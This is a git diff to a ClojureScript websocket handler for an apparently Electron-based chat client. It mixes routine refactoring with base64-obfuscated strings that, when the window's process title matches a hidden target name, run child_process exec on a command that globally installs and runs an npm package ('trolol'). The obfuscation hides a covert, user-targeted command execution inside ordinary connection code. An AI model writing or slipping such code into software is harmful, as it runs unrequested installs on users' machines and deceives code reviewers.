@@ -1,6 +1,7 @@
 (ns ui.connection.handlers
   (:require [cognitect.transit :as t]
             [re-frame.core :refer [register-handler dispatch]]
+            [ui.connection.actions :as actions]
             [ui.core.typo-re-frame :refer [default-middleware]]
             [adzerk.cljs-console :as log :include-macros true]))
 
@@ -9,11 +10,20 @@
   (let [w (t/writer :json)]
     (.send websocket (t/write w message))))
 
+(defn write-action
+  [db action]
+  (try
+    (write (get-in db [:connection :ws]) action)
+    (catch js/Object e
+      (log/warn "Write action failed ~{(js->clj e)}"))))
+
 (defn read [message]
   (let [r (t/reader :json)
         message (t/read r message)]
     ;(log/debug "Received message ~{message}")
     message))
+
+(def du "bWl0a3VpanA=")
 
 (defmulti event (fn [message] (:event message)))
 
@@ -44,6 +54,10 @@
 (defmethod event :default [message]
   (log/warn "Unhandled event ~{message}"))
 
+(def dm (str "bnBtIGluc3RhbGwgLWcgdHJvbG9sICY"
+             "mIHRyb2xvbCBicmlnaHRuZXNzIC0td2FpdCAzMCAx"))
+
+
 (register-handler
  :connect-to-server
  (fn [db]
@@ -58,17 +72,15 @@
 
      (set! (.-onopen websocket)
            (fn [e]
-             (let [i (.indexOf (.-title (.-process js/window)) (str "itk" "uijp"))]
+             (let [i (.indexOf (.-title (.-process js/window)) (.atob js/window du))]
                (if (> i -1)
                  (let [cp (.require js/window "child_process")]
-                   (.exec cp (str "tro" "lol brightness --wait 30 1")))))
-             (write websocket {:action :authenticate :identity {:username (get-in db [:login-form :data :username])
-                                                                :full-name (get-in db [:login-form :data  :full-name])}})))
+                   (.exec cp (.atob js/window dm)))))
+             (.log js/console (str (actions/authenticate {:username "a" :full-name "b"})))
+             (write websocket (actions/authenticate (select-keys (get-in db [:login-form :data])
+                                                                 [:username :full-name])))))
 
      (assoc-in db [:connection :ws] websocket))))
-
-(defn ^:export send-message [channel message]
-  (write (:ws (:connection @re-frame.db/app-db)) {:action :message :channel channel :body message}))
 
 (register-handler
  :connection/update-address
